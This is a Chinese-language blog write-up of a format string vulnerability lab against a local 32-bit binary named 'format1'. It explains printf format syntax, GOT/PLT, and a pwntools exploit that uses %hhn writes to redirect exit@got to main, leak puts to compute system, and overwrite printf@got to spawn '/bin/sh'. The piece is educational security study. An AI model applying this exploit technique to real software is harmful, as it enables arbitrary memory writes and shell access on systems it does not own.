基本格式\n%[parameter][flags][fieldwidth][.precision][length]type\nparameter\n可以忽略或者是n$，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数； flags\n用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等； fieldwidth\n限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示； precision\n输出的最大长度； length\n指浮点型参数或者整形参数的长度； hh：1-byte； h：2-byte； l：4-byte； ll：8-byte； type\n转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；\n| 字符 | 描述 | | —— | —————————————————————————————— | | d/i | 有符号十进制整数 | | u | 无符号十进制整数 | | x/X | 以十六进制形式输出无符号整数(不输出前缀0x) | | o | 以八进制形式输出无符号整数(不输出前缀0) | | s | 字符串 | | c | 字符 | | p | 指针 | | n | 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量 | | f/F | 以小数形式输出单、双精度实数 | | e/E | 以指数形式输出单、双精度实数 | | g/G | 以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用 | | a/A | 浮点数、十六进制数字和p-计数法 |\n0x03 漏洞原理 格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制；\n根据cdecl的调用约定，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是%，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。 格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了格式化字符串漏洞。\n0x04 漏洞分析 分析 用IDAPro对format1程序进行分析，程序逻辑简单，在main函数中调用了getname函数 查看getname()函数，读取用户输入，发现print(buf)将用户输入进行打印，存在格式化字符串漏洞。 由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址： 利用思路 将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数； 通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址； 用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入/bin/sh，当执行printf(buf)时，相当于执行system('/bin/sh')； 利用过程 将exit函数的GOT表地址覆盖为main函数地址 将exit函数的GOT表地址覆写为main函数的地址，每次退出时将再返回到main函数。 先解决构建printf（format，[argument]）中format和argument\nformat覆写的格式为：% width c % num $ hhn\nwidth是将要写入到$hhn参数中的值，它由覆写的值和已经写入的长度决定，具体为：（已写入的长度-覆写的值）%0x80 根据反汇编可以看到buf数组的长度为0x80 num定了要写入的第num个参数，通过调试具体分析一下 这里给出两种方法\n用gdb调试\n在main和printf处设置断点。 然后运行程序，运行到printf地方 buf的地址为0xffffd12c,是printf中格式化字符串的第7个参数:即(0xffffd12c - 0xffffd110 ) / 4 = 7 通过pwntools进行查找\n简单的exp:\n1 2 3 4 5 6 7 8 from pwn import * context.log_level=\u0026#39;debug\u0026#39; p = process(\u0026#39;./format1\u0026#39;) payload = b\u0026#39;a\u0026#39; * 4 + b\u0026#39; \u0026#39; + b\u0026#39; %08x\u0026#39; * 20 print(payload) p.sendline(payload) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) 运行结果如下\n明显的看到0x61616161即为第七个参数 num的确定\n因为要把exit的GOT地址覆写为main函数地址，即0x8048648，所以应写入四个字节，即重复四次% width c % num $ hhn； 粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式% widthc % num $ hhn占用12个字节，四次重复共48个字节，占用48/4=12个参数； 由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22； 确定exit@got的地址；\n这里同样给出两种方法 gdb查看反汇编指令 先disass main查看main函数地址 发现exit@plt的地址为0x8048480 然后查看disass 0x8048480的反汇编，即进入exit@plt的函数内部 jmp所对应的的地址即为exit@got 为 0x804a024 直接借用gdb中的got命令 exit@got 为 0x804a024 main函数地址\n第一条即为main函数地址 ： 0x08048648 构造格式化字符串:\n确定了num和width，也确定了exit函数的got表地址为0x804a024，所以将要覆盖的exit@got地址0x804a024、0x804a025、0x804a026、0x804a027依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：\n1 %72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\\x24\\xa0\\x04\\x08\\x25\\xa0\\x04\\x08\\x26\\xa0\\x04\\ x08\\x27\\xa0\\x04\\x08 编写generate_format(addr, value)函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def generate_format(addr,value): payload=\u0026#39;\u0026#39; # 已写入的长度 print_count = 0 addr_part = \u0026#39;\u0026#39; # range 4 的原因是 地址为四个字节，四个循环即可结束。 for i in range(4): if value \u0026gt;\u0026gt; (8*i) == 0: break one_byte = (value \u0026gt;\u0026gt; (8*i)) \u0026amp; 0xff # 0x100的原因 防止出现负数 payload += \u0026#39;%{0}c%{1}$hhn\u0026#39;.format((one_byte - print_count + 0x100) % 0x100,19+i) print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr+i).decode(\u0026#39;unicode_escape\u0026#39;) payload = payload.ljust((12)*4,\u0026#39;a\u0026#39;) payload += addr_part return payload 调用generate_format(exit_got,main)函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即0x08048648； 获取system的地址 获取思路分析\n由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址； 先获取puts函数的got表地址，(这里与上面的方法相同)，所以puts函数got表的地址为0x804a01c，虽然可以直接查看0x804a01c内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；\n构造格式化字符串\n构造的格式化字符串格式为：%num$s+puts@got，即把puts@got的地址写入 buf，再通过%s读出； 此时读出的puts地址为 puts在程序中真正运行的地址 其中%num$s占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置； 获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为/lib/i386-linux-gnu/libc.so.6； 所以get_sys_addr 有如下代码\n1 2 3 4 5 6 7 8 9 10 11 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_got_addr = elf.got[\u0026#34;puts\u0026#34;] payload_puts = \u0026#34;%8$s\u0026#34; + p32(puts_got_addr).decode(\u0026#39;unicode_escape\u0026#39;) p.sendline(payload_puts) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_addr = u32(p.recv(4)) libc = ELF(\u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34;) offset = libc.symbols[\u0026#39;puts\u0026#39;]-libc.symbols[\u0026#39;system\u0026#39;] sys_addr = puts_addr - offset 运行结果\n根据接收到的四个字节，我们可以看到拿到puts地址为0xf7e37cd0,system地址为0xf7e0b830 将其我们用gdb调试得到的地址相比，正确 覆写got 表中printf地址 原理与覆写exit函数GOT表相同，调用generate_format(printf@got,system_addr)，生成的payload作为输入，代码如下：\n1 2 3 4 printf_got = elf.got[\u0026#39;printf\u0026#39;] payload_system = generate_format(printf_got,sys_addr) p.sendline(payload_system) 运行代码 可以发现printf@got被覆盖为0xf7e0b830 执行system(\u0026rsquo;/bin/sh') 此时GOT表中printf地址已被覆写为system地址，在buf中输入/bin/sh，执行printf(buf)时，相当于执行system('/bin/sh')，最后代码如下:\n1 2 3 4 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) p.sendline(\u0026#34;/bin/sh\u0026#34;) p.interactive() 运行编写的python代码，成功拿到shell权限；\n0x05 总结 格式化字符串漏洞泄露内存数据和覆写内存理解加深。 Linux中got表和plt表的关系进一步理解。 pwntools查看函数参数的位置的一些用法 pwntools可以直接导入elf,process,libc库 ","permalink":"http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","summary":"格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参","title":"格式化字符串"},{"content":"BUPT在读 目前希望找到方向\n","permalink":"http://www.reus09.top/about/","summary":"BUPT在读 目前希望找到方向","title":"About"},{"content":"","permalink":"http://www.reus09.top/links/","summary":"","title":"Links"}]